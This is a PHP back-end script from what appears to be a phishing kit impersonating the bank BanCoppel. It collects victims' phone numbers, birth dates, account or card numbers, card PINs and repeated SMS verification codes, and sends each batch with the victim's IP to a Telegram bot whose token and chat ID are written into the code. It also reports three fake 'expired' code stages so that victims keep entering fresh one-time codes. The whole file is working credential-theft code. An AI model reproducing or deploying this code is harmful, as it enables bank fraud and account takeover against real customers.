<?php
session_start();
@ini_set("display_errors", 0);

function getRealIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    }
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ipList[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getRealIP();
$_SESSION['user_ip'] = $ip;

$apiToken = "8838033702:AAHCm8Ja3A9Blsxm-Af6YF4cq4ai-H1voJw";   //        BOT TOKEN
$chatId = "-5130146974";       //        CHAT ID

function sendTelegram($message) {
    global $apiToken, $chatId;
    $telegramUrl = "https://api.telegram.org/bot$apiToken/sendMessage";
    $params = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramUrl);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        error_log("Telegram API error: " . curl_error($ch));
    }
    return $response;
}

if (
    isset($_POST['celular']) &&
    isset($_POST['fecha']) &&
    isset($_POST['cliente']) &&
    isset($_POST['numero'])
) {
    $tipos = [
        'cliente' => 'Número de Cliente',
        'cuenta' => 'Número de Cuenta',
        'tarjeta' => 'Tarjeta BanCoppel'
    ];

    if (!array_key_exists($_POST['cliente'], $tipos)) {
        header("HTTP/1.1 400 Bad Request");
        echo "Tipo de identificación no válido";
        exit();
    }

    $_SESSION['celular'] = $_POST['celular'];
    $_SESSION['fecha'] = $_POST['fecha'];
    $_SESSION['tipo'] = $_POST['cliente'];
    $_SESSION['numero'] = $_POST['numero'];
    $_SESSION['tipo_descripcion'] = $tipos[$_POST['cliente']];

    $message =  "👤 ‼️Nuevo acceso‼️\n";
    $message .= "📱 Celular: " . htmlspecialchars($_POST['celular']) . "\n";
    $message .= "🎂 Fecha Nacimiento: " . htmlspecialchars($_POST['fecha']) . "\n";
    $message .= "🪪 Tipo: " . $tipos[$_POST['cliente']] . "\n";
    $message .= "🔢 Número: " . htmlspecialchars($_POST['numero']) . "\n";
    $message .= "🌎 IP: " . $ip;

    sendTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();

} elseif (isset($_POST['digitosTarjeta']) && isset($_POST['nip'])) {
    if (!preg_match('/^[0-9]{2}$/', $_POST['digitosTarjeta'])) {
        header("HTTP/1.1 400 Bad Request");
        echo "Los últimos 2 dígitos de la tarjeta no son válidos";
        exit();
    }
    if (!preg_match('/^[0-9]{4}$/', $_POST['nip'])) {
        header("HTTP/1.1 400 Bad Request");
        echo "El NIP debe contener exactamente 4 dígitos";
        exit();
    }

    $_SESSION['digitos_tarjeta'] = $_POST['digitosTarjeta'];
    $_SESSION['nip'] = $_POST['nip'];

    $message =  "🟢 Bancoppel - Verificación\n";
    $message .= "🔢 Últimos (2 dígitos) : " . htmlspecialchars($_POST['digitosTarjeta']) . "\n";
    $message .= "🔐 NIP (4 dígitos): " . htmlspecialchars($_POST['nip']) . "\n";
    $message .= "🌎 IP: " . $ip . "\n";
    $message .= "🕒 Fecha/Hora: " . date('Y-m-d H:i:s');

    sendTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => 'ok']);
    exit();

} elseif (
    isset($_POST['digit1']) && isset($_POST['digit2']) && isset($_POST['digit3']) &&
    isset($_POST['digit4']) && isset($_POST['digit5']) && isset($_POST['digit6'])
) {
    $codigo = $_POST['digit1'] . $_POST['digit2'] . $_POST['digit3'] .
              $_POST['digit4'] . $_POST['digit5'] . $_POST['digit6'];

    $smsStage = isset($_POST['sms_stage']) ? intval($_POST['sms_stage']) : 1;

    $stageMap = [
        1 => ['title' => "✅ CÓDIGO SMS 1️⃣", 'status' => 'expired'],
        2 => ['title' => "✅ CÓDIGO SMS 2️⃣", 'status' => 'expired'],
        3 => ['title' => "✅ CÓDIGO SMS 3️⃣", 'status' => 'expired'],
        4 => ['title' => "✅ CÓDIGO SMS 4️⃣", 'status' => 'finish']
    ];

    $stage = isset($stageMap[$smsStage]) ? $stageMap[$smsStage] : $stageMap[1];

    $message = $stage['title'] . "\n";
    $message .= "🔢 Código: " . htmlspecialchars($codigo) . "\n";
    $message .= "🌎 IP: " . $ip . "\n";
    $message .= "📱 Celular: " . (isset($_SESSION['celular']) ? $_SESSION['celular'] : 'No disponible');

    sendTelegram($message);
    header('Content-Type: application/json');
    echo json_encode(['status' => $stage['status']]);
    exit();
} else {
    header("HTTP/1.1 400 Bad Request");
    echo "Error: Faltan datos obligatorios en el formulario.";
    exit();
}
?>